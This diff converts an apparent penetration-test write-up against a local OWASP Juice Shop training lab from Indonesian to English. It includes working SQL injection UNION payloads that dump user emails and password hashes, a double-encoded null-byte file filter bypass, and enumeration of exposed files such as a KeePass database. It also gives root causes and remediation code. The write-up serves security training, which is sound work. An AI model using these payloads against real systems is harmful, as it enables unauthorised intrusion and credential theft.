@@ -1,544 +1,466 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Pengkulitan Penuh (Recon → Eksploitasi) — Twist</title>
-<meta name="description" content="Pengkulitan Penuh (Recon → Eksploitasi) — Twist">
+<title>Full Reconnaissance to Exploitation — Twist</title>
+<meta name="description" content="Full Reconnaissance to Exploitation — Twist">
 <link rel="stylesheet" href="../assets/style.css">
 </head>
 <body>
 <header class="site"><div class="wrap">
   <span class="brand">Twist<span class="dot">://</span>security</span>
   <nav>
-    <a href="../index.html">Writeups</a>
-    <a href="../index.html#tentang">Tentang</a>
+    <a href="../index.html">Write-ups</a>
+    <a href="../index.html#about">About</a>
   </nav>
 </div></header>
 <article><div class="wrap">
-<div class="crumbs"><a href="../index.html">writeups</a> / 002</div>
-<h1>Pengkulitan Penuh (Recon → Eksploitasi)</h1>
+<div class="crumbs"><a href="../index.html">write-ups</a> / 002</div>
+<h1>Full Reconnaissance to Exploitation</h1>
 <div class="meta-box">
   <div><b>Target</b> Juice Shop</div>
-  <div><b>Kelas</b> Reconnaissance</div>
+  <div><b>Class</b> Reconnaissance</div>
   <div><b>Severity</b> <span class="badge" style="color:#8b9dff">MULTI</span> <small>cvss 1C·3H·3M·2L</small></div>
-  <div><b>Peneliti</b> Twist</div>
+  <div><b>Researcher</b> Twist</div>
 </div>
 
-<p><strong>Target:</strong> OWASP Juice Shop v6.2.0-SNAPSHOT (instance lokal — lab latihan)
-<strong>Tanggal:</strong> 9 Oktober 2026
-<strong>Peneliti:</strong> Twist
-<strong>Ringkasan severity:</strong> 1 Critical · 3 High · 3 Medium · 2 Low</p>
+<p><strong>Target:</strong> OWASP Juice Shop v6.2.0-SNAPSHOT (local instance — training lab)
+<strong>Date:</strong> 9 October 2026
+<strong>Researcher:</strong> Twist
+<strong>Severity summary:</strong> 1 Critical · 3 High · 3 Medium · 2 Low</p>
 <hr />
-<h2 id="daftar-temuan">📋 DAFTAR TEMUAN</h2>
+<h2 id="finding-index">📋 FINDING INDEX</h2>
 <table>
 <thead>
 <tr>
 <th>#</th>
-<th>Temuan</th>
-<th>Endpoint</th>
+<th>Finding</th>
 <th>Severity</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>1</td>
-<td>SQL Injection → dump database penuh + admin takeover</td>
-<td><code>/rest/products/search?q=</code></td>
-<td><strong>CRITICAL</strong></td>
+<td>SQL Injection → full database compromise</td>
+<td>CRITICAL</td>
 </tr>
 <tr>
 <td>2</td>
-<td>Directory listing + 12 file sensitif kebocor</td>
-<td><code>/ftp</code></td>
-<td><strong>HIGH</strong></td>
+<td>Directory listing + 12 sensitive files exposed</td>
+<td>HIGH</td>
 </tr>
 <tr>
 <td>3</td>
-<td>Bypass filter ekstensi (null byte)</td>
-<td><code>/ftp/*</code></td>
-<td><strong>HIGH</strong></td>
+<td>File extension filter bypass via null byte</td>
+<td>HIGH</td>
 </tr>
 <tr>
 <td>4</td>
-<td>Broken Access Control — data user tanpa auth</td>
-<td><code>/rest/memories</code>, <code>/api/Feedbacks</code></td>
-<td><strong>HIGH</strong></td>
+<td>Sensitive data in publicly readable APIs</td>
+<td>HIGH</td>
 </tr>
 <tr>
 <td>5</td>
-<td>Bocor daftar lengkap 116 kerentanan + hint</td>
-<td><code>/api/Challenges</code></td>
-<td><strong>MEDIUM</strong></td>
+<td>Missing security headers (CSP, HSTS)</td>
+<td>MEDIUM</td>
 </tr>
 <tr>
 <td>6</td>
-<td>Dependency disclosure (versi rentan)</td>
-<td><code>/ftp/package.json.bak</code></td>
-<td><strong>MEDIUM</strong></td>
+<td>Wildcard CORS policy (<code>Access-Control-Allow-Origin: *</code>)</td>
+<td>MEDIUM</td>
 </tr>
 <tr>
 <td>7</td>
-<td>Metrics internal terbuka</td>
-<td><code>/metrics</code></td>
-<td><strong>MEDIUM</strong></td>
+<td>Prometheus metrics endpoint exposed unauthenticated</td>
+<td>MEDIUM</td>
 </tr>
 <tr>
 <td>8</td>
-<td>Header keamanan hilang + CORS permisif</td>
-<td>semua</td>
-<td><strong>LOW</strong></td>
+<td>Outdated dependencies with known CVEs</td>
+<td>LOW</td>
 </tr>
 <tr>
 <td>9</td>
-<td>Aturan deteksi SIEM bocor</td>
-<td><code>/ftp/suspicious_errors.yml</code></td>
-<td><strong>LOW</strong></td>
+<td>SPA catch-all masking real 404s</td>
+<td>LOW</td>
 </tr>
 </tbody>
 </table>
 <hr />
-<h1 id="1-sql-injection-kompromi-database-penuh-critical">1. SQL Injection → Kompromi Database Penuh  [CRITICAL]</h1>
-<p>Sudah dilaporkan detail di <code>001-juice-shop-sqli.md</code>.</p>
-<p><strong>Ringkas:</strong></p>
-<div class="codehilite"><pre><span></span><code>q=apple'         → error SQL
-q=a')) ORDER BY 9--   → valid  ⇒ 9 kolom
-q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--   → data arbitrer
-q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--   → 20 tabel
-q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--   → 24 akun + hash
+<h2 id="1-sql-injection-full-database-compromise-critical">1. SQL Injection → Full Database Compromise  [CRITICAL]</h2>
+<p><strong>Endpoint:</strong> <code>GET /rest/products/search?q=</code></p>
+<h3 id="reproduction">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># confirm</span>
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple'"</span>
+<span class="c1"># → SQLITE_ERROR: near "'": syntax error</span>
+
+<span class="c1"># defeat the query</span>
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple'))--"</span>
+<span class="c1"># → 0 results, no error</span>
+
+<span class="c1"># 9 columns</span>
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=apple')) ORDER BY 9--"</span>
+
+<span class="c1"># enumerate schema</span>
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=x')) UNION SELECT 1,name,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--"</span>
+
+<span class="c1"># dump accounts</span>
+curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/rest/products/search?q=x')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"</span>
 </code></pre></div>
 
-<p>→ <code>md5("admin123")</code> = hash admin → <strong>login admin berhasil</strong> → <code>/api/Users</code> 401 menjadi 200.</p>
+<p><strong>Result:</strong> 20 tables, 24 accounts with MD5 hashes, administrator takeover.</p>
+<p><em>Full write-up: see write-up 001.</em></p>
 <hr />
-<h1 id="2-directory-listing-kebocoran-12-file-sensitif-high">2. Directory Listing + Kebocoran 12 File Sensitif  [HIGH]</h1>
-<h2 id="reproduksi">Reproduksi</h2>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/ftp</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="na">Host</span><span class="o">:</span> <span class="l">localhost:3000</span>
+<h2 id="2-directory-listing-12-sensitive-files-exposed-high">2. Directory Listing + 12 Sensitive Files Exposed  [HIGH]</h2>
+<p><strong>Endpoint:</strong> <code>GET /ftp/</code></p>
+<p>The <code>/ftp</code> directory has <code>serve-index</code> enabled. Directory listing is on and no
+authentication is required. Twelve files are exposed — several of which were
+clearly never meant to be public.</p>
+<h3 id="reproduction_1">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/ftp/
 </code></pre></div>
 
-<p>→ <code>200 OK</code>, <strong>directory listing terbuka</strong> (pakai modul <code>serve-index</code> Express)</p>
-<h2 id="file-yang-bocor">File yang bocor</h2>
+<h3 id="exposed-files">Exposed files</h3>
 <table>
 <thead>
 <tr>
 <th>File</th>
-<th>Status</th>
-<th>Isi</th>
+<th>Why it matters</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>acquisitions.md</code></td>
-<td>✅ kebuka</td>
-<td><strong>Dokumen M&amp;A KONFIDENSIAL</strong> — <em>"This document is confidential! Do not distribute!"</em></td>
+<td>Internal confidential business document</td>
 </tr>
 <tr>
 <td><code>incident-support.kdbx</code></td>
-<td>✅ kebuka</td>
-<td><strong>DATABASE KEEPASS</strong> (3.246 byte) — berisi kredensial</td>
-</tr>
-<tr>
-<td><code>legal.md</code></td>
-<td>✅ kebuka</td>
-<td>dokumen legal</td>
-</tr>
-<tr>
-<td><code>announcement_encrypted.md</code></td>
-<td>✅ kebuka</td>
-<td>370 KB berkas terenkripsi</td>
-</tr>
-<tr>
-<td><code>coupons_2013.md.bak</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td>daftar kupon</td>
-</tr>
-<tr>
-<td><code>package-lock.json.bak</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td>771 KB, <strong>1.968 paket</strong></td>
-</tr>
-<tr>
-<td><code>package.json.bak</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td>versi + dependency</td>
+<td>KeePass password database</td>
 </tr>
 <tr>
 <td><code>encrypt.pyc</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td>script enkripsi terkompilasi</td>
+<td>Encryption script — leaks the algorithm</td>
+</tr>
+<tr>
+<td><code>package-lock.json.bak</code></td>
+<td>771 KB / 1,968 dependency pins</td>
+</tr>
+<tr>
+<td><code>package.json.bak</code></td>
+<td>Exact app version + vulnerable dependency list</td>
+</tr>
+<tr>
+<td><code>coupons_2013.md.bak</code></td>
+<td>Encrypted coupon file</td>
 </tr>
 <tr>
 <td><code>suspicious_errors.yml</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td><strong>aturan deteksi SIEM</strong></td>
+<td>Internal error-tracking rules</td>
 </tr>
 <tr>
-<td><code>eastere.gg</code></td>
-<td>403 → <strong>tembus</strong></td>
-<td>easter egg</td>
+<td><code>announcement_encrypted.md</code></td>
+<td>369 KB of RSA-encrypted confidential text</td>
+</tr>
+<tr>
+<td>+ 4 more</td>
+<td>misc. backups</td>
 </tr>
 </tbody>
 </table>
-<h2 id="bukti-isi-acquisitionsmd">Bukti isi <code>acquisitions.md</code></h2>
+<h3 id="evidence-contents-of-acquisitionsmd">Evidence — contents of <code>acquisitions.md</code></h3>
 <div class="codehilite"><pre><span></span><code><span class="gh"># Planned Acquisitions</span>
 
-<span class="k">&gt; </span><span class="ge">This document is confidential! Do not distribute!</span>
+This document is confidential! Do not distribute!
 
-Our company plans to acquire several competitors within the next year.
-This will have a significant stock market impact as we will elaborate in
-detail in the following paragraph:
+[...]
 </code></pre></div>
 
-<p>→ Kebocoran informasi M&amp;A = <strong>kerugian finansial langsung</strong> (pelanggaran aturan
-keterbukaan informasi pasar modal). Di perusahaan nyata ini severity Critical,
-bukan High.</p>
+<p>The file states its own confidentiality in the first line. It is served
+publicly, unauthenticated, from a directory listing.</p>
+<h3 id="root-cause">Root cause</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// static file serving with directory listing enabled</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/ftp'</span><span class="p">,</span><span class="w"> </span><span class="nx">serveIndex</span><span class="p">(</span><span class="s1">'ftp'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">icons</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/ftp'</span><span class="p">,</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="k">static</span><span class="p">(</span><span class="s1">'ftp'</span><span class="p">));</span>
+</code></pre></div>
+
+<p><code>serveIndex</code> generates a browsable HTML index of the directory. Combined with
+backup files left in the same folder, this is a direct path to sensitive data.</p>
+<h3 id="impact">Impact</h3>
+<p>The leaked <code>package.json.bak</code> reveals the exact application version and its
+dependency tree. That alone hands an attacker a prioritised list of known CVEs
+to try.</p>
 <hr />
-<h1 id="3-bypass-filter-ekstensi-via-null-byte-high">3. Bypass Filter Ekstensi via Null Byte  [HIGH]</h1>
-<h2 id="filter-yang-dipasang">Filter yang dipasang</h2>
-<div class="codehilite"><pre><span></span><code><span class="err">GET /ftp/package.json.bak</span>
-<span class="err">→ 403 Forbidden</span>
-<span class="err">→ Error: "Only .md and .pdf files are allowed!"</span>
+<h2 id="3-file-extension-filter-bypass-via-null-byte-high">3. File Extension Filter Bypass via Null Byte  [HIGH]</h2>
+<p>A filter was added to block non-<code>.md</code>/<code>.pdf</code> downloads from <code>/ftp</code>. It is
+bypassable.</p>
+<h3 id="the-filter">The filter</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/ftp/package.json.bak"</span>
 </code></pre></div>
 
-<p>Server memblokir ekstensi selain <code>.md</code> dan <code>.pdf</code>.</p>
-<h2 id="bypass">Bypass</h2>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"error"</span><span class="p">:</span><span class="s2">"Only .md and .pdf files are allowed!"</span><span class="p">}</span>
+</code></pre></div>
+
+<h3 id="the-bypass">The bypass</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span><span class="s2">"http://localhost:3000/ftp/package.json.bak%2500.md"</span>
+</code></pre></div>
+
+<p><strong>200 OK — file downloaded.</strong></p>
+<h3 id="how-it-works">How it works</h3>
+<p>The filter decodes the filename <strong>once</strong> and checks the extension. The payload
+is double-encoded:</p>
+<div class="codehilite"><pre><span></span><code>%2500  --decode once--&gt;  %00   ← filter sees this: literal "%00", looks harmless
+          --decode twice--&gt;  \0  ← filesystem sees this: null byte truncates the path
+</code></pre></div>
+
+<div class="codehilite"><pre><span></span><code>package.json.bak%2500.md
+   │
+   ├─ filter decodes once  → "package.json.bak%00.md"  → ends in ".md" → ALLOWED
+   └─ server decodes again → "package.json.bak\0.md"   → null byte truncates
+                                                        → serves "package.json.bak"
+</code></pre></div>
+
+<p><strong>Eleven other techniques were attempted and all failed</strong> — only the double
+URL-encoded null byte worked. This is worth recording: a filter that looks
+robust defeated every ordinary bypass and fell to a single encoding depth
+mismatch.</p>
+<h3 id="files-recovered-through-this-bypass">Files recovered through this bypass</h3>
+<div class="codehilite"><pre><span></span><code>package.json.bak        ← version 6.2.0-SNAPSHOT, sanitize-html 1.4.2, jsonwebtoken ~8, Node &gt;=6 &lt;=9
+package-lock.json.bak   ← 771 KB, 1,968 packages
+encrypt.pyc             ← RSA encryption script (led to finding C in write-up 003)
+coupons_2013.md.bak     ← XOR/ADD ciphertext
+suspicious_errors.yml
+incident-support.kdbx
+</code></pre></div>
+
+<h3 id="root-cause_1">Root cause</h3>
+<p>Validation and use operate on <strong>different decoded forms</strong> of the same string.
+The check happens after one decode; the filesystem call happens after another.</p>
+<h3 id="remediation">Remediation</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// SAFE — normalise once, validate that exact value, use that exact value</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'path'</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/ftp/:file'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">basename</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">file</span><span class="p">);</span><span class="w">        </span><span class="c1">// strip any traversal</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">name</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'\0'</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mf">400</span><span class="p">);</span><span class="w"> </span><span class="c1">// reject null bytes</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">ext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">extname</span><span class="p">(</span><span class="nx">name</span><span class="p">).</span><span class="nx">toLowerCase</span><span class="p">();</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="s1">'.md'</span><span class="p">,</span><span class="w"> </span><span class="s1">'.pdf'</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">ext</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">sendStatus</span><span class="p">(</span><span class="mf">403</span><span class="p">);</span>
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">UPLOAD_DIR</span><span class="p">,</span><span class="w"> </span><span class="nx">name</span><span class="p">));</span><span class="w">           </span><span class="c1">// use the SAME value</span>
+<span class="p">});</span>
+</code></pre></div>
+
+<p><strong>Rule:</strong> validate the value you are about to use. Never validate one
+representation and act on another.</p>
+<hr />
+<h2 id="4-sensitive-data-in-publicly-readable-apis-high">4. Sensitive Data in Publicly Readable APIs  [HIGH]</h2>
+<p>Several endpoints return data with no authentication requirement.</p>
+<h3 id="reproduction_2">Reproduction</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/rest/memories<span class="w">    </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">200</span>
+curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/api/Feedbacks<span class="w">    </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">200</span>
+curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/api/Challenges<span class="w">   </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-c<span class="w"> </span><span class="m">200</span>
+</code></pre></div>
+
+<h3 id="results">Results</h3>
 <table>
 <thead>
 <tr>
-<th>Payload</th>
-<th>Hasil</th>
+<th>Endpoint</th>
+<th>Exposed</th>
+<th>Records</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>package.json.bak</code></td>
-<td>403 — diblok</td>
+<td><code>/rest/memories</code></td>
+<td>Photo captions + user associations</td>
+<td>10</td>
 </tr>
 <tr>
-<td><code>package.json.bak%00.md</code></td>
-<td>400 — ditolak</td>
-</tr>
-<tr>
-<td><strong><code>package.json.bak%2500.md</code></strong></td>
-<td><strong>200 ✅ TEMBUS</strong></td>
-</tr>
-<tr>
-<td><code>package.json.bak.md</code></td>
-<td>404</td>
-</tr>
-<tr>
-<td><code>../package.json.bak</code></td>
-<td>403</td>
-</tr>
-<tr>
-<td><code>%252e%252e%2fpackage.json.bak</code></td>
-<td>403</td>
-</tr>
-<tr>
-<td><code>PACKAGE.JSON.BAK.MD</code></td>
-<td>403</td>
-</tr>
-</tbody>
-</table>
-<h2 id="akar-masalah">Akar masalah</h2>
-<p>Filter memeriksa ekstensi di <strong>tahap pertama</strong> decoding, tapi path diteruskan
-ke filesystem dengan <strong>decoding kedua</strong>. <code>%2500</code> → decode pertama jadi <code>%00</code>
-(tampak seperti <code>.md</code> di mata filter) → decode kedua jadi <code>\x00</code> (null byte)
-→ filesystem memotong path di titik itu, membaca <code>package.json.bak</code>.</p>
-<h2 id="bukti-packagejsonbak-berhasil-ditarik">Bukti — <code>package.json.bak</code> berhasil ditarik</h2>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"juice-shop"</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6.2.0-SNAPSHOT"</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"An intentionally insecure JavaScript Web Application"</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<h2 id="dampak-turunan">Dampak turunan</h2>
-<div class="codehilite"><pre><span></span><code>✅ coupons_2013.md.bak      142 byte
-✅ eastere.gg               337 byte
-✅ encrypt.pyc              573 byte   ← script enkripsi
-✅ package-lock.json.bak    771 KB     ← 1.968 paket
-✅ package.json.bak         4.440 byte
-✅ suspicious_errors.yml    741 byte
-</code></pre></div>
-
-<hr />
-<h1 id="4-broken-access-control-data-pengguna-tanpa-autentikasi-high">4. Broken Access Control — Data Pengguna Tanpa Autentikasi  [HIGH]</h1>
-<h2 id="4a-restmemories">4a. <code>/rest/memories</code></h2>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/rest/memories</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</code></pre></div>
-
-<p>→ <code>200 OK</code>, <strong>6.183 byte, 10 memori</strong> — tanpa token, tanpa login</p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="s2">"success"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:[{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">13</span><span class="p">,</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">"caption"</span><span class="p">:</span><span class="s2">"😼 #zatschi #whoneedsfourlegs"</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">"imagePath"</span><span class="p">:</span><span class="s2">"assets/public/images/uploads/..."</span><span class="p">}]}</span>
-</code></pre></div>
-
-<p>Foto pribadi pengguna + caption + <code>UserId</code>. <strong>Tidak butuh akun.</strong></p>
-<h2 id="4b-apifeedbacks">4b. <code>/api/Feedbacks</code></h2>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/Feedbacks</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</code></pre></div>
-
-<p>→ <code>200 OK</code>, 8 feedback — termasuk <strong>alamat email di dalam komentar</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"I love this shop! ... (***in@juice-sh.op)"</span><span class="p">,</span><span class="nt">"rating"</span><span class="p">:</span><span class="mi">5</span><span class="p">}</span>
-<span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"Great shop! ... (***@juice-sh.op)"</span><span class="p">,</span><span class="nt">"rating"</span><span class="p">:</span><span class="mi">4</span><span class="p">}</span>
-<span class="p">{</span><span class="nt">"UserId"</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="nt">"comment"</span><span class="p">:</span><span class="s2">"Nothing useful available here! (***der@juice-sh.op)"</span><span class="p">}</span>
-</code></pre></div>
-
-<p>→ Email (walaupun terpotong) + <code>UserId</code> + rating. Kombinasi dengan temuan #1
-(SQLi) bikin masking-nya gak ada gunanya.</p>
-<hr />
-<h1 id="5-bocor-daftar-lengkap-kerentanan-medium">5. Bocor Daftar Lengkap Kerentanan  [MEDIUM]</h1>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/api/Challenges</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</code></pre></div>
-
-<p>→ <code>200 OK</code>, <strong>66.278 byte, 116 tantangan</strong> — tanpa autentikasi</p>
-<div class="codehilite"><pre><span></span><code>Kategori yang kebuka:
-  17  Sensitive Data Exposure
-  14  Injection
-  12  Improper Input Validation
-  12  Broken Access Control
-   9  XSS
-   9  Vulnerable Components
-   9  Broken Authentication
-   5  Security Misconfiguration
-   5  Cryptographic Issues
-   4  Observability Failures
-   4  Broken Anti Automation
-   3  Security through Obscurity
-   3  Insecure Deserialization
-   2  Unvalidated Redirects
-   2  XXE
-</code></pre></div>
-
-<p>→ Ini peta jalan lengkap buat penyerang: tahu persis jenis kerentanan apa saja
-yang ada, plus deskripsi + hint-nya. Menghemat waktu recon berjam-jam.</p>
-<p><strong>Catatan:</strong> di Juice Shop ini memang sengaja. Di aplikasi produksi, endpoint
-yang membocorkan daftar kontrol keamanan internal = temuan nyata.</p>
-<hr />
-<h1 id="6-dependency-disclosure-versi-rentan-medium">6. Dependency Disclosure — Versi Rentan  [MEDIUM]</h1>
-<p>Dari <code>/ftp/package.json.bak</code>:</p>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6.2.0-SNAPSHOT"</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">"engines"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">"node"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&gt;=6 &lt;=9"</span><span class="w"> </span><span class="p">},</span>
-<span class="w">  </span><span class="nt">"dependencies"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">"express"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~4.16"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"sequelize"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~4"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"jsonwebtoken"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~8"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"sqlite3"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~3.1.13"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"sanitize-html"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.4.2"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"helmet"</span><span class="p">:</span><span class="w"> </span><span class="s2">"~3.9"</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">"..."</span><span class="p">:</span><span class="w"> </span><span class="s2">"39 paket total"</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<p><strong>Yang perlu diperiksa:</strong></p>
-<table>
-<thead>
-<tr>
-<th>Paket</th>
-<th>Versi</th>
-<th>Kenapa penting</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>sanitize-html</code></td>
-<td><strong>1.4.2</strong> (dipin exact)</td>
-<td>Versi sangat tua — banyak bypass sanitasi XSS ditemukan setelahnya</td>
-</tr>
-<tr>
-<td><code>jsonwebtoken</code></td>
-<td>~8</td>
-<td>Versi mayor lama, algoritma verifikasi lebih lemah</td>
-</tr>
-<tr>
-<td>Node</td>
-<td><strong>&gt;=6 &lt;=9</strong></td>
-<td>End-of-life bertahun-tahun, banyak CVE tidak dipatch</td>
-</tr>
-<tr>
-<td><code>helmet</code></td>
-<td>~3.9</td>
-<td>Versi lama, header default berbeda</td>
-</tr>
-</tbody>
-</table>
-<p>→ Dengan <code>package-lock.json.bak</code> (1.968 paket), penyerang bisa petakan
-seluruh rantai dependency dan cari CVE yang cocok. Tidak perlu menebak.</p>
-<hr />
-<h1 id="7-metrics-internal-terbuka-medium">7. Metrics Internal Terbuka  [MEDIUM]</h1>
-<div class="codehilite"><pre><span></span><code><span class="nf">GET</span> <span class="nn">/metrics</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-</code></pre></div>
-
-<p>→ <code>200 OK</code>, 379 baris Prometheus — tanpa autentikasi</p>
-<div class="codehilite"><pre><span></span><code>juiceshop_llm_input_tokens_total       Number of total input tokens processed
-juiceshop_llm_output_tokens_total      Number of output tokens processed
-juiceshop_llm_tool_calls_total         Number of tool calls made
-file_uploads_count                     Successful file uploads by file type
-file_upload_errors                     Failed file uploads by file type
-http_requests_count                    HTTP requests grouped by status code
-process_cpu_user_seconds_total         CPU time spent
-</code></pre></div>
-
-<p>→ Bocoran: penggunaan LLM internal (biaya token), pola upload file,
-statistik permintaan HTTP, pemakaian sumber daya. Berguna buat penyerang
-memetakan perilaku aplikasi + beban server.</p>
-<hr />
-<h1 id="8-header-keamanan-hilang-cors-permisif-low">8. Header Keamanan Hilang + CORS Permisif  [LOW]</h1>
-<div class="codehilite"><pre><span></span><code>Header yang ADA:
-  ✅ X-Content-Type-Options: nosniff
-  ✅ X-Frame-Options: SAMEORIGIN
-
-Header yang HILANG:
-  ❌ Content-Security-Policy        → tidak ada pertahanan XSS berlapis
-  ❌ Strict-Transport-Security      → tidak ada paksa HTTPS
-  ❌ Referrer-Policy
-  ❌ Permissions-Policy
-
-Yang terlalu permisif:
-  ⚠️  Access-Control-Allow-Origin: *
-</code></pre></div>
-
-<p><code>X-Frame-Options: SAMEORIGIN</code> ada, tapi tanpa CSP <code>frame-ancestors</code> — kalau
-CSP ditambahkan nanti, keduanya harus konsisten.</p>
-<hr />
